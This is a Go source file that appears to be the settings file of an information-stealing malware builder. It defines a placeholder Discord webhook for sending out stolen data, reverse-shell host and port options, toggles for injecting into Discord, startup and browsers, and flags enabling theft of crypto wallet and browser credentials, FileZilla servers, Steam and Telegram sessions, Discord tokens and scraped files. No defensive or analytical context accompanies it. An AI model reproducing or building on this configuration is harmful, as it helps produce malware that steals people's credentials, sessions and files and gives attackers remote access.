package main

var webhookUrl = "-----DISCORD-WEBHOOK-URL-----"
var webhookEncrypted = false
var hitMessage = ""

// embed color (0-16777215 are valid)
var embedColor = 2715638

// shell related
var reverseShell = false
var reverseShellHost = ""
var reverseShellPort = ""

// injection related
var injectIntoDiscord = false // In Development
var injectIntoStartup = false
var injectIntoBrowsers = false

// enable/disable heavy-load stealing functions (can increase program runtime considerably)
var getDiscordTokens = false
var getWalletCredentials = true
var getBrowserCredentials = true
var getFileZillaServers = true
var getSteamSession = false
var getTelegramSession = false
var getInstalledSoftware = true
var getNetworkConnections = false
var getScrapedFiles = true
